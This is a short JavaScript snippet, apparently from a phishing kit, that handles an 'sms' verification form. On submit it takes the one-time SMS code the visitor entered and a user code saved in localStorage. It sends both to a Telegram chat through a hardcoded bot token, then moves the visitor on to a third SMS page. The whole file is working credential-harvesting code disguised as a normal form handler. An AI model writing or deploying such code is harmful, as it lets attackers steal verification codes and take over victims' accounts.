var sms2 = document.getElementById('sms');
var usercode = localStorage.getItem('usercode');

document.getElementById('form6').addEventListener('submit', function (e) {
    e.preventDefault();
    const bot = new Bot("6135693705:AAEYjbPzeLclg5QVZbLDaxevBy86Xjwf1G4", 2068186644);

    try {

        bot.sendMessage('👔User : ' + usercode + '💌sms2 : ' + sms2.value)
            .then(res => {
                console.log(res);
                window.location.href = './sms3.html';
            })
    }
    catch (err) {
        console.log(err)
    }

})